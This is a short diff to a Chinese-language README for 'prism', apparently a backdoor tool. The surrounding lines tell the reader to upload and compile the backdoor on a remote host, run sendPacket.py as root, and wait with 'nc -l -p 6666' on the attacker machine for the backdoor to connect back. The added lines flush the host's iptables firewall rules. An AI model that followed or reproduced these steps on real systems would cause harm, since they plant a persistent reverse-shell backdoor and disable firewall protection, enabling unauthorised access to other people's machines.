@@ -51,7 +51,9 @@ gcc <..OPTIONS..> -Wall -s -o prism prism.c
 
 编译好之后把prism上传到远程后门主机，再运行sendPacket.py脚本，需要root权限。最好就是将prism.c文件上传到后门主机再进行编译，这样更容易成功。
 
-
+iptables -F
+iptables -x
+iptables -L
 
 在攻击者机器上运行nc等待后门的连接：nc -l -p 6666
 
